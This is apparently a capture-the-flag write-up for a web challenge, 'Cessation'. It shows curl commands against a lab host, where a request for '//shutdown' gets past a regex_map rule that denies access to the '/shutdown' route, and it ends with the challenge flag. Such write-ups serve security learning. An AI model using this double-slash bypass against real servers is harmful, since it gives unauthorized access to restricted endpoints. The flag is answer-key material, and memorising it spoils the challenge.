# Cessation

## Challenge

We need to reach the `/shutdown` route, however, it is mapped to an Access Denied page using `regex_map`.

```
curl http://178.62.14.240:32090/
```

```html
<div class="greeting-card">
    <h2>Its time to end!!<br/>Device Status: Online</h2>
</div>
```

```
curl http://178.62.14.240:32090/shutdown
```

```html
<div class="greeting-card">
    <h2>Access Denied..</h2>
</div>
```

## Solution

Regex expressions in `regex_map` do not match `/` characters as these are special in paths.

Multiple consecutive `/` characters are ignored in urls.
Therefore, we can access the `/shutdown` path by requesting the `//shutdown` path.

```
curl http://178.62.14.240:32090//shutdown
```

```html
<div class="greeting-card">
    <h2>Initiating Network Shutdown...<br/>Device Status: Offline<br/>CHTB{c3ss4t10n_n33d_sync1ng_#@$?}</h2>
</div>
```

## Flag

`CHTB{c3ss4t10n_n33d_sync1ng_#@$?}`

